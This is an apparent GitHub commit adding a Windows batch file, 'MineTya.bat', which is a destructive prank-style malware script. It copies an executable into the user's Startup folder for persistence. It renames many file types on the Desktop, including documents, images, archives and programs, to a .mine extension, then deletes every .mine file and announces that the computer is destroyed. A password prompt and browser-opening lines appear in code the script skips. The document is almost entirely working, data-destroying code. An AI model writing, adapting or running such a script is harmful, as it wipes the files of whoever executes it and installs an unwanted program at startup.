1f530e208d549afdc4dc335ac668e079f8d76598
MineTya <94125199+MineTya@users.noreply.github.com>
2021-11-18 17:53:40 +0000

    Add files via upload

---
+++ MineTya.bat
@@ -0,0 +1,41 @@
+@echo off
+title DestroyingMineTya
+color 0A
+
+:beginning
+cd C:\Users\%USERNAME%\Desktop
+copy MineTya.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+rename *.txt *.mine
+rename *.mp3 *.mine
+rename *.jpg *.mine
+rename *.png *.mine
+rename *.iso *.mine
+rename *.dll *.mine
+rename *.mp4 *.mine
+rename *.rar *.mine
+rename *.zip *.mine
+rename *.mkv *.mine
+rename *.exe *.mine
+rename *.jar *.mine
+rename *.ini *.mine
+rename *.bin *.mine
+rename *.sdi *.mine
+goto start
+
+start https://theuselessweb.site/youareanidiot/idiot/index.html
+start https://theuselessweb.site/youareanidiot/idiot/index.html
+
+SET /P pass=Enter Password
+
+IF %pass%==@[[6Ah5phjfUJddjgkGdshksAb]]@ goto cracked1
+
+:cracked1
+
+:start
+del *.mine
+cls
+echo Hello your computer destroyed bruh
+echo.
+echo.
+echo By:Zapytajswojejstarej#3400
+pause
